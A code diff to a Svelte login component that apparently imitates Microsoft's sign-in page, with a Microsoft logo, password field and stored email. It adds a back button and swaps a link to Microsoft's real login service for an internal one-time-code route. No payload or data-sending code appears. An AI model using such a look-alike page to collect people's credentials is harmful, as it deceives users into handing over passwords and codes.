@@ -3,6 +3,8 @@ import { emailStore } from '../stores.js';
 import MicrosoftSvg from '../assets/microsoft.svg';
 import SignUpFooter from '../lib/SignUpFooter.svelte';
 // import { push } from 'svelte-spa-router';
+import { link } from "svelte-spa-router";
+
 
 let password = "";
 let showPassword = false;
@@ -60,6 +62,11 @@ function redirectUrl() {
 <div class="wrapper">
   <div class="container">
     <div class="card">
+       <div class="back-button">
+        <button class="icon-btn" on:click={() => window.history.back()}>
+          <svg viewBox="0 0 24 24" width="16"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+      </div>
 
       <!-- Logo -->
       <div class="logo-wrapper">
@@ -120,7 +127,7 @@ function redirectUrl() {
         </button>
       </div>
 
-      <p class="other"><a href="https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&client_id=9199bf20-a13f-4107-85dc-02114787ef48&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&contextid=F6E4FBB1C8E6D8AE&opid=A457B7DCF128D61D&bk=1772788533&&mkt=EN-US&lc=1033&uaid=aa5d786301e783c42d7f31772f123e2a&npc=7">Other ways to sign in </a></p>
+      <p class="other"><a href="/otp" use:link >Send a code to {$emailStore}</a></p>
 
     </div>
   </div>
@@ -151,6 +158,23 @@ function redirectUrl() {
   border-radius: 4px;
   box-shadow: none;
 }
+
+.back-button {
+    margin-bottom: -20px;
+  }
+
+    .icon-btn {
+    background: transparent;
+    width: auto;
+    padding: 8px;
+    color: #666;
+  }
+
+  .icon-btn:hover {
+    background: white;
+  }
+
+
 
 /* LOGO + EMAIL */
 .logo-wrapper {
